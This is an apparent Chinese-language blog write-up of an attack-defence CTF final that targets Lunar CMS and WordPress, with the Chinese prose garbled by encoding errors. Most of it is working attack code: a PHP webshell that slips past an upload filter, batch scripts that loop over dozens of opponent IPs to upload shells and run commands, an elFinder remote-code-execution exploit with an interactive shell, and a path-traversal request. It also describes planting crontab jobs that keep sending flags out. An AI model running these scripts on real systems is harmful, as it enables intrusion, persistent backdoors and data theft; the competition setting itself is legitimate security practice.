<p>ä¸Šä¼ æ²¡æœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œæ ¡éªŒï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œå¯¹ä¸Šä¼ æ–‡ä»¶å†…å®¹è¿›è¡Œäº†æ ¡éªŒï¼Œåªæ ¡éªŒäº†â€™ &lt;? â€˜å’Œâ€™ php â€˜,å¹¶ä¸”å¯¹ php æ ¡éªŒæ²¡æœ‰ä½¿ç”¨ /i ,ä¹Ÿå°±æ˜¯åªæ ¡éªŒå°å†™çš„ php ,æ‰€ä»¥åˆ©ç”¨ pHp,å°±å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œè€Œå¯¹äºâ€™ &lt;? â€˜ç»•è¿‡çš„æ–¹å¼ä¹Ÿç‰¹åˆ«å¤šï¼Œæ¯”å¦‚åˆ©ç”¨â€™ &lt;= â€˜ æˆ–è€…ç”¨</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'pHp'</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[Cyc1e])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¾¿å¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä¸Šä¼ æœ¨é©¬åˆ©ç”¨ï¼Œæ‰€ä»¥å¯ä»¥å†™æ‰¹é‡æ”»å‡»çš„Exp</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Exp_upload.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Administrator</span></span><br><span class="line"><span class="comment"># @Date:   2018-12-07 16:17:39</span></span><br><span class="line"><span class="comment"># @Last Modified by:   Cyc1e</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2018-12-07 23:26:08</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line"></span><br><span class="line">def submit_cookie(answer):</span><br><span class="line">    #test = <span class="string">"gongfan_flag\&#123;10848bd4d2318970279b6c124866bcdc5a04ca50eaaaf92c6cf0021754ae43e6\&#125;"</span></span><br><span class="line">    submit_ip = <span class="string">'172.91.1.12:9090'</span></span><br><span class="line">    <span class="attribute">urls</span>=<span class="string">'http://%s/ad/hacker/submit/submitCode'</span>% submit_ip</span><br><span class="line">    post = &#123;<span class="string">'flag'</span>:answer&#125;</span><br><span class="line">    <span class="string">''</span><span class="string">'cmder = '</span> %s -b <span class="string">"JSESSIONID=C64DD133EFDDB22CE5BE4CA3991AB6DF"</span> -d <span class="string">"flag=%s"</span><span class="string">'% (urls,answer)</span></span><br><span class="line"><span class="string">                #print cmd</span></span><br><span class="line"><span class="string">                os.system('</span>curl <span class="string">' + cmder)'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">    header = &#123;<span class="string">'Host'</span>: <span class="string">'172.91.1.12:9090'</span>,</span><br><span class="line">			  <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">			  <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">			  <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">			  <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">			  <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">			  <span class="string">'Referer'</span>: <span class="string">'http://172.91.1.12:9090/arace/index'</span>,</span><br><span class="line">			  <span class="string">'Content-Length'</span>: <span class="string">'14'</span>,</span><br><span class="line">			  <span class="string">'Cookie'</span>: <span class="string">'JSESSIONID=51EF0ADB25F425E2BE7C5871C29B1D7A'</span>&#125;</span><br><span class="line">    req = requests.post(urls,headers = header,<span class="attribute">data</span>=post)</span><br><span class="line">    <span class="builtin-name">print</span> req.content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'errorInfo'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.content:</span><br><span class="line">    	<span class="builtin-name">print</span> <span class="string">' '</span> + req.content</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">'pm.php'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">lists = &#123;<span class="string">'172.91.0.101'</span>,<span class="string">'172.91.0.104'</span>,<span class="string">'172.91.0.106'</span>,<span class="string">'172.91.0.112'</span>,<span class="string">'172.91.0.115'</span>,<span class="string">'172.91.0.116'</span>,<span class="string">'172.91.0.122'</span>,<span class="string">'172.91.0.125'</span>,<span class="string">'172.91.0.135'</span>,<span class="string">'172.91.0.138'</span>,<span class="string">'172.91.0.144'</span>,<span class="string">'172.91.0.18'</span>,<span class="string">'172.91.0.33'</span>,<span class="string">'172.91.0.34'</span>,<span class="string">'172.91.0.35'</span>,<span class="string">'172.91.0.42'</span>,<span class="string">'172.91.0.44'</span>,<span class="string">'172.91.0.45'</span>,<span class="string">'172.91.0.47'</span>,<span class="string">'172.91.0.51'</span>,<span class="string">'172.91.0.53'</span>,<span class="string">'172.91.0.54'</span>,<span class="string">'172.91.0.59'</span>,<span class="string">'172.91.0.60'</span>,<span class="string">'172.91.0.61'</span>,<span class="string">'172.91.0.62'</span>,<span class="string">'172.91.0.64'</span>,<span class="string">'172.91.0.68'</span>,<span class="string">'172.91.0.69'</span>,<span class="string">'172.91.0.70'</span>,<span class="string">'172.91.0.78'</span>,<span class="string">'172.91.0.82'</span>,<span class="string">'172.91.0.87'</span>,<span class="string">'172.91.0.88'</span>,<span class="string">'172.91.0.91'</span>,<span class="string">'172.91.0.92'</span>,<span class="string">'172.91.0.93'</span>,<span class="string">'172.91.0.94'</span>,<span class="string">'172.91.0.97'</span>,<span class="string">'172.91.0.99'</span>&#125;</span><br><span class="line">cmd = <span class="string">'cat /flag/flag.txt'</span></span><br><span class="line"><span class="comment">#cmd = 'dir'</span></span><br><span class="line"><span class="comment">#submit_cookie(111,'asdadasd')</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> lists:</span><br><span class="line">		#ip = <span class="string">'127.0.0.1/pcb/html/'</span></span><br><span class="line">		<span class="builtin-name">print</span> ip</span><br><span class="line">		url = <span class="string">'http://%s:8080/admin/certificate/index.php'</span>% ip</span><br><span class="line">		url1 = <span class="string">'http://%s:8080/admin/certificate/u/pm.php'</span>% ip</span><br><span class="line">		#shell_data = &#123;<span class="string">'pass'</span>:<span class="string">'BOI_youcanyoujump'</span>,<span class="string">'shy'</span>:<span class="string">'system("'</span> + cmd + <span class="string">'");'</span>&#125;</span><br><span class="line">		shell_data = &#123;<span class="string">'Cyc1e'</span>:<span class="string">'system("'</span> + cmd + <span class="string">'");'</span>&#125;</span><br><span class="line">		try:</span><br><span class="line">			req2 = requests.<span class="builtin-name">get</span>(url1,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">			<span class="keyword">if</span> req2.status_code != 200:</span><br><span class="line">				req = requests.post(url = url,files = files,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">			req3 = requests.<span class="builtin-name">get</span>(url1,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">			<span class="keyword">if</span> req3.status_code == 200:</span><br><span class="line">				<span class="builtin-name">print</span> url1</span><br><span class="line">				req1 = requests.post(url = url1,data = shell_data,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">				<span class="builtin-name">print</span> req1.content</span><br><span class="line">			#submit_cookie(req1.content)</span><br><span class="line">		except:</span><br><span class="line">			sleep(0.5)</span><br><span class="line">	sleep(60)</span><br></pre></td></tr></table></figure>
<p>pm.php <code>&lt;script language=&#39;pHp&#39;&gt;eval($_POST[Cyc1e])&lt;/script&gt;</code></p>
<h3 id="0x03-ç‰ˆæœ¬-RCE-æ¼æ´åˆ©ç”¨"><a href="#0x03-ç‰ˆæœ¬-RCE-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x03 ç‰ˆæœ¬ RCE æ¼æ´åˆ©ç”¨"></a>0x03 ç‰ˆæœ¬ RCE æ¼æ´åˆ©ç”¨</h3><p>ç»§ç»­Diffæ–‡ä»¶å‘ç°å¹¶æ²¡æœ‰æ·»åŠ å…¶ä»–çš„å¼‚å¸¸ä»£ç å’Œæ–‡ä»¶ï¼Œæ‰€ä»¥Diffä¹Ÿå°±åªå¯ä»¥å‘ç°è¿™ä¸¤ä¸ªåˆ©ç”¨ç‚¹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦æ‰¾çš„å°±æ˜¯ Lunar CMS 3.3 ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨ç‰ˆæœ¬æ¼æ´ï¼Œè€Œ3.3ç‰ˆæœ¬æ°å¥½å­˜åœ¨ä¸€ä¸ªRCEåˆ©ç”¨ç‚¹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.exploit-db.com/exploits/33867ï¼Œæ–‡ç« é‡Œçš„æœ‰å†™å¥½çš„EXP" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33867ï¼Œæ–‡ç« é‡Œçš„æœ‰å†™å¥½çš„EXP</a></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#......</span><br><span class="line">#</span><br><span class="line"># Tested on: Apache/<span class="number">2.4</span><span class="number">.7</span> (Win32)</span><br><span class="line">#            PHP/<span class="number">5.5</span><span class="number">.6</span></span><br><span class="line">#            MySQL <span class="number">5.6</span><span class="number">.14</span></span><br><span class="line">#......</span><br><span class="line">import cookielib, urllib</span><br><span class="line">import urllib2, sys, <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line">piton = <span class="built_in">os</span>.<span class="built_in">path</span>.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">'\n\x20\x20[*] Usage: '</span>+piton+<span class="string">' &lt;hostname&gt; &lt;path&gt; &lt;filename.php&gt;\n'</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">'\x20\x20[*] Example: '</span>+piton+<span class="string">' zeroscience.mk lunarcms backdoor.php\n'</span></span><br><span class="line">	sys.<span class="built_in">exit</span>()</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">path</span> = sys.argv[<span class="number">2</span>]</span><br><span class="line">fname = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">cj = cookielib.CookieJar()</span><br><span class="line">opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line"></span><br><span class="line"><span class="built_in">create</span> = opener.<span class="built_in">open</span>(<span class="string">'http://'</span>+host+<span class="string">'/'</span>+<span class="built_in">path</span>+<span class="string">'/admin/includes/elfinder/php/connector.php?cmd=mkfile&amp;name='</span>+fname+<span class="string">'&amp;target=l1_XA'</span>)</span><br><span class="line">#<span class="built_in">print</span> <span class="built_in">create</span>.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">payload = urllib.urlencode(&#123;</span><br><span class="line">							<span class="string">'cmd'</span> : <span class="string">'put'</span>,</span><br><span class="line">							<span class="string">'target'</span> : <span class="string">'l1_'</span>+fname.encode(<span class="string">'base64'</span>,<span class="string">'strict'</span>),</span><br><span class="line">							<span class="string">'content'</span> : <span class="string">'&lt;?php passthru($_GET[\'cmd\']); ?&gt;'</span></span><br><span class="line">							&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">write</span> = opener.<span class="built_in">open</span>(<span class="string">'http://'</span>+host+<span class="string">'/'</span>+<span class="built_in">path</span>+<span class="string">'/admin/includes/elfinder/php/connector.php'</span>, payload)</span><br><span class="line">#<span class="built_in">print</span> <span class="built_in">write</span>.<span class="built_in">read</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">'\n'</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">	try:</span><br><span class="line">		cmd = raw_input(<span class="string">'shell@'</span>+host+<span class="string">':~# '</span>)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">execute</span> = opener.<span class="built_in">open</span>(<span class="string">'http://'</span>+host+<span class="string">'/'</span>+<span class="built_in">path</span>+<span class="string">'/files/'</span>+fname+<span class="string">'?cmd='</span>+urllib.quote(cmd))</span><br><span class="line">		<span class="built_in">reverse</span> = <span class="built_in">execute</span>.<span class="built_in">read</span>()</span><br><span class="line">		<span class="built_in">print</span> <span class="built_in">reverse</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> cmd.strip() == <span class="string">'exit'</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	except Exception:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sys.<span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure>
<p>å¯¹phpç¯å¢ƒæœ‰æ‰€è¦æ±‚ï¼Œåœ¨ php/5.5.6ä¸€ä¸‹ç‰ˆæœ¬æ˜¯æµ‹è¯•æˆåŠŸçš„ï¼Œä¸è¿‡åˆšå¥½ï¼ŒæœåŠ¡å™¨çš„phpç¯å¢ƒæ˜¯å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´çš„ï¼Œå¯¹äºæ”»é˜²èµ›è€Œè¨€ï¼Œéœ€è¦å°†è„šæœ¬è¿›è¡Œä¿®æ”¹ï¼Œåˆ©ç”¨requestsåº“è¿›è¡Œé‡å†™ </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Exp_RCE.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def submit_cookie(answer):</span><br><span class="line">    #test = <span class="string">"gongfan_flag\&#123;10848bd4d2318970279b6c124866bcdc5a04ca50eaaaf92c6cf0021754ae43e6\&#125;"</span></span><br><span class="line">    submit_ip = <span class="string">'172.91.1.12:9090'</span></span><br><span class="line">    <span class="attribute">urls</span>=<span class="string">'http://%s/ad/hacker/submit/submitCode'</span>% submit_ip</span><br><span class="line">    post = &#123;<span class="string">'flag'</span>:answer&#125;</span><br><span class="line">    <span class="string">''</span><span class="string">'cmder = '</span> %s -b <span class="string">"JSESSIONID=C64DD133EFDDB22CE5BE4CA3991AB6DF"</span> -d <span class="string">"flag=%s"</span><span class="string">'% (urls,answer)</span></span><br><span class="line"><span class="string">                #print cmd</span></span><br><span class="line"><span class="string">                os.system('</span>curl <span class="string">' + cmder)'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">    header = &#123;<span class="string">'Host'</span>: <span class="string">'172.91.1.12:9090'</span>,</span><br><span class="line">			  <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">			  <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">			  <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">			  <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">			  <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">			  <span class="string">'Referer'</span>: <span class="string">'http://172.91.1.12:9090/arace/index'</span>,</span><br><span class="line">			  <span class="string">'Content-Length'</span>: <span class="string">'14'</span>,</span><br><span class="line">			  <span class="string">'Cookie'</span>: <span class="string">'JSESSIONID=51EF0ADB25F425E2BE7C5871C29B1D7A'</span>&#125;</span><br><span class="line"></span><br><span class="line">    req = requests.post(urls,headers = header,<span class="attribute">data</span>=post)</span><br><span class="line">    <span class="builtin-name">print</span> req.content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'errorInfo'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.content:</span><br><span class="line">    	<span class="builtin-name">print</span> <span class="string">' '</span> + req.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fname = <span class="string">'shell.php'</span></span><br><span class="line">payload = &#123;</span><br><span class="line">				<span class="string">'cmd'</span> : <span class="string">'put'</span>,</span><br><span class="line">				<span class="string">'target'</span> : <span class="string">'l1_'</span>+fname.encode(<span class="string">'base64'</span>,<span class="string">'strict'</span>),</span><br><span class="line">				<span class="string">'content'</span> : <span class="string">'&lt;?php passthru($_GET[\'</span>cmd\<span class="string">']); ?&gt;'</span></span><br><span class="line">				&#125;</span><br><span class="line">cmd = <span class="string">'cat /flag/flag.txt'</span></span><br><span class="line">lists = &#123;<span class="string">'172.91.0.101'</span>,<span class="string">'172.91.0.104'</span>,<span class="string">'172.91.0.106'</span>,<span class="string">'172.91.0.112'</span>,<span class="string">'172.91.0.115'</span>,<span class="string">'172.91.0.116'</span>,<span class="string">'172.91.0.122'</span>,<span class="string">'172.91.0.125'</span>,<span class="string">'172.91.0.135'</span>,<span class="string">'172.91.0.138'</span>,<span class="string">'172.91.0.144'</span>,<span class="string">'172.91.0.18'</span>,<span class="string">'172.91.0.33'</span>,<span class="string">'172.91.0.34'</span>,<span class="string">'172.91.0.35'</span>,<span class="string">'172.91.0.42'</span>,<span class="string">'172.91.0.44'</span>,<span class="string">'172.91.0.45'</span>,<span class="string">'172.91.0.47'</span>,<span class="string">'172.91.0.51'</span>,<span class="string">'172.91.0.53'</span>,<span class="string">'172.91.0.54'</span>,<span class="string">'172.91.0.59'</span>,<span class="string">'172.91.0.60'</span>,<span class="string">'172.91.0.61'</span>,<span class="string">'172.91.0.62'</span>,<span class="string">'172.91.0.64'</span>,<span class="string">'172.91.0.68'</span>,<span class="string">'172.91.0.69'</span>,<span class="string">'172.91.0.70'</span>,<span class="string">'172.91.0.78'</span>,<span class="string">'172.91.0.82'</span>,<span class="string">'172.91.0.87'</span>,<span class="string">'172.91.0.88'</span>,<span class="string">'172.91.0.91'</span>,<span class="string">'172.91.0.92'</span>,<span class="string">'172.91.0.93'</span>,<span class="string">'172.91.0.94'</span>,<span class="string">'172.91.0.97'</span>,<span class="string">'172.91.0.99'</span>&#125;</span><br><span class="line"></span><br><span class="line">mat = re.compile(<span class="string">".*([0-9a-z]&#123;192&#125;).*"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">		host = i</span><br><span class="line">		#host = <span class="string">'127.0.0.1/CMS/LunarCMS-master/'</span></span><br><span class="line">		<span class="builtin-name">print</span> host</span><br><span class="line">		try:</span><br><span class="line">			url = <span class="string">'http://'</span>+host+<span class="string">':8080/admin/includes/elfinder/php/connector.php?cmd=mkfile&amp;name='</span> + fname + <span class="string">'&amp;target=l1_XA'</span></span><br><span class="line">			create = requests.<span class="builtin-name">get</span>(url,timeout = 1)</span><br><span class="line">			url2 = <span class="string">'http://'</span>+host+<span class="string">':8080/admin/includes/elfinder/php/connector.php'</span></span><br><span class="line">			write = requests.post(url2, data = payload,timeout = 1)</span><br><span class="line">			url3 = <span class="string">'http://'</span>+host+<span class="string">':8080/files/'</span>+fname+<span class="string">'?cmd='</span>+ cmd</span><br><span class="line"></span><br><span class="line">			execute = requests.<span class="builtin-name">get</span>(url3,timeout = 0.5)</span><br><span class="line">			reverse = execute.content</span><br><span class="line">			<span class="builtin-name">print</span> reverse</span><br><span class="line">			flag = mat.findall(reverse)[0]</span><br><span class="line">			<span class="builtin-name">print</span> flag</span><br><span class="line">			<span class="keyword">if</span> len(flag) &gt; 0 :</span><br><span class="line">				submit_cookie(flag)</span><br><span class="line">		except Exception:</span><br><span class="line">			pass</span><br><span class="line">		sleep(0.5)</span><br><span class="line">	sleep(30)</span><br></pre></td></tr></table></figure>



<h2 id="2-Wordpressæºç åˆ†æ"><a href="#2-Wordpressæºç åˆ†æ" class="headerlink" title="2. Wordpressæºç åˆ†æ"></a>2. Wordpressæºç åˆ†æ</h2><p>Wordpressæ˜¯4.9ç‰ˆæœ¬ï¼Œä¸‹è½½æºç çš„å‘ç°50å¤šMï¼Œé‚£å¾ˆæ˜æ˜¾æ˜¯å®‰è£…äº†ä¸€äº›æ’ä»¶äº†ï¼ˆæ¡†æ¶æºç 20å¤šMï¼‰ï¼Œæœ¬èœä¸»è¦è¿˜æ˜¯åˆ©ç”¨Wordpressä¸Šçš„åˆ†ï¼Œæ¯•ç«Ÿç¬¬ä¸€å¤©åœ¨Lunar CMSä¸Šç¿»è½¦äº†ï¼Œå¾—é ç¬¬äºŒå¤©ç¿»ç›˜ä¸€ä¸‹ã€‚</p>
<h3 id="0x01-æ™®æ™®é€šé€šçš„ä¸€å¥è¯åé—¨"><a href="#0x01-æ™®æ™®é€šé€šçš„ä¸€å¥è¯åé—¨" class="headerlink" title="0x01 æ™®æ™®é€šé€šçš„ä¸€å¥è¯åé—¨"></a>0x01 æ™®æ™®é€šé€šçš„ä¸€å¥è¯åé—¨</h3><p> å¤§å¸ˆå‚…ä»¬é—®æˆ‘æ€ä¹ˆç¬¬ä¸€è½®å°±å¼€æ‰“äº†ï¼ˆ5åˆ†é’Ÿä¸€è½®ï¼‰ï¼Œå¯èƒ½æˆ‘ç½‘é€Ÿæ¯”è¾ƒå¿«å§ã€‚è¾¹ä¸‹è½½æºç è¾¹å¾€ Webshellkill ç”©ï¼Œå¾ˆæˆåŠŸçš„æ‰«åˆ°äº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬<br><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-44bae86741a0ed93.png" alt></p>
<p>æˆ‘æœ¬ä»¥ä¸ºåˆå¯ä»¥æ”¶ä¸€ä¸ªé«˜å¤§ä¸Šçš„é©¬äº†ï¼Œç‚¹å¼€ä¸€çœ‹ <code>&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;</code> ç›´æ¥ä¿®æ”¹ç¬¬ä¸€å¤©çš„Expå°±å¼€æ‰“äº†ï¼Œæ‰€ä»¥é€Ÿåº¦å¿«äº†ç‚¹ï¼Œæ“ä½œè¿™ä¹ˆå¿«è‡ªç„¶ä¸å¯èƒ½åªç”¨æ¥è¯»flagï¼Œè‚¯å®šè¦å¹²äº›å…¶ä»–çš„äº‹ï¼Œåé¢å†™ã€‚</p>
<h3 id="0x02-Site-Importæ’ä»¶æœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#0x02-Site-Importæ’ä»¶æœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="0x02 Site Importæ’ä»¶æœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"></a>0x02 Site Importæ’ä»¶æœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</h3><p>è¿™ä¸ªæ´ä¸€ä¸‹æ²¡æœ‰å‘ç°ï¼Œè¢«æ‰“äº†å¥½å‡ è½®ï¼Œæ¼æ´ç‚¹åœ¨/wp-content/plugins/site-import/admin/page.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">site_import_namespace</span>;</span><br><span class="line"></span><br><span class="line">	$page = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	$url = parse_url($page);</span><br><span class="line">	$url[<span class="string">'path'</span>] = pathinfo(<span class="keyword">isset</span>($url[<span class="string">'path'</span>])?$url[<span class="string">'path'</span>]:<span class="string">''</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($url[<span class="string">'path'</span>][<span class="string">'dirname'</span>]) || $url[<span class="string">'path'</span>][<span class="string">'dirname'</span>]==<span class="string">'\\'</span>)$url[<span class="string">'path'</span>][<span class="string">'dirname'</span>] = <span class="string">'/'</span>;</span><br><span class="line">	<span class="comment">//if($url['path']['dirname'][strlen($url['path']['dirname'])-1]!='/')$url['path']['dirname'] .= '/';</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change_link</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change_link_2</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">               ......</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$context = stream_context_create(<span class="keyword">array</span>(<span class="string">'http'</span> =&gt; <span class="keyword">array</span>(<span class="string">'max_redirects'</span> =&gt; <span class="number">101</span>)));</span><br><span class="line">	$content = file_get_contents($page, <span class="keyword">false</span>, $context);</span><br><span class="line">	$content = preg_replace_callback(<span class="string">"/(\&lt;(img|link|a) [^\&gt;]*?)(href|src)\=\"([^\"]+?)\"/"</span>, <span class="string">'site_import_namespace\change_link'</span>, $content);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾ï¼Œæ²¡æœ‰å¯¹$pageå˜é‡åšä»»ä½•å¤„ç†å°±ç›´æ¥ä¼ åˆ°äº†file_get_contents()å‡½æ•°ä¸­ï¼Œç›´æ¥å¯¼è‡´äº†æ–‡ä»¶åŒ…å«ï¼Œæ„é€ <code>/page.php?url=../../../../../../../../../flag</code>å°±å¥½äº†ï¼Œè¿™é‡Œå°±ä¸è´´Expäº†</p>
<h3 id="0x03-simple-ads-manager-æ’ä»¶ä¸­çš„SQLæ³¨å…¥æ¼æ´"><a href="#0x03-simple-ads-manager-æ’ä»¶ä¸­çš„SQLæ³¨å…¥æ¼æ´" class="headerlink" title="0x03 simple-ads-manager æ’ä»¶ä¸­çš„SQLæ³¨å…¥æ¼æ´"></a>0x03 simple-ads-manager æ’ä»¶ä¸­çš„SQLæ³¨å…¥æ¼æ´</h3><p>è¿™ä¸ªæ¼æ´åœ¨è¿™æ¬¡åˆ©ç”¨ä»·å€¼ä¸å¤§ï¼Œæ¯•ç«Ÿæ³¨å…¥å‡ºæ¥çš„éƒ½æ˜¯åŠ å¯†çš„ï¼Œæ³¨å…¥çš„æµé‡åˆ°å¤„é£ï¼Œæœ‰äº›é˜Ÿéƒ½æŠŠæ•°æ®åº“ç»™å…³äº†  - -.. ï¼Œçœ‹ä¸æ‡‚çš„æ“ä½œï¼Œè¿™é‡Œä¸è¿‡å¤šè¯´æ˜äº†ï¼Œå¯ä»¥å‚è€ƒï¼š<a href="https://www.exploit-db.com/exploits/36613" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36613</a> è¿›è¡Œå¤ç°æµ‹è¯•ã€‚</p>
<h2 id="3-ç®€å•åˆ†äº«åˆ†äº«è¿™æ¬¡çš„æ‰“æ³•"><a href="#3-ç®€å•åˆ†äº«åˆ†äº«è¿™æ¬¡çš„æ‰“æ³•" class="headerlink" title="3. ç®€å•åˆ†äº«åˆ†äº«è¿™æ¬¡çš„æ‰“æ³•"></a>3. ç®€å•åˆ†äº«åˆ†äº«è¿™æ¬¡çš„æ‰“æ³•</h2><p>ç¬¬ä¸€å¤©çš„å°±ä¸å†™äº†ï¼Œä¸»è¦ä¸Šåˆ†åœ¨äºç¬¬äºŒå¤©ï¼Œæœ€å Web3 æ‹¿äº†3800å¤šåˆ†ï¼Œè¿˜ç®—ä¸é”™çš„ï¼Œä¸»è¦å› ä¸ºæ“ä½œå¤±è¯¯ï¼Œåº”è¯¥æ˜¯èƒ½å¤Ÿé‚£ 4000+ çš„åˆ†çš„ï¼Œç”±äºæ¯”è¾ƒå¿«æ‰«åˆ°äº† Wordpress ä¸­çš„ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰€ä»¥ç«‹å³è¿æ¥æœ¨é©¬ï¼Œæ‰¹é‡æ’å…¥äº†<strong>Crontab</strong>å®šæ—¶ä»»åŠ¡ï¼Œåˆ©ç”¨æœ¨é©¬ç›´æ¥è°ƒç”¨ system() å‡½æ•°ï¼ŒåµŒå…¥åå¼¹flagçš„å®šæ—¶ä»»åŠ¡ï¼Œä¸ç®¡å¯¹æ–¹æ€ä¹ˆè¡¥æ¼æ´ï¼Œä¸€æ ·èƒ½å¾ˆè½»æ¾çš„æ‹¿åˆ° flag çš„ï¼ˆ<em>æœ¬èœç¬¬ä¸€æ¬¡çº¿ä¸‹çš„æ—¶å€™è¢«ä¸€ç™½å¸ˆå‚…è¿™æ ·æ‰“è’™äº†</em>ï¼‰</p>
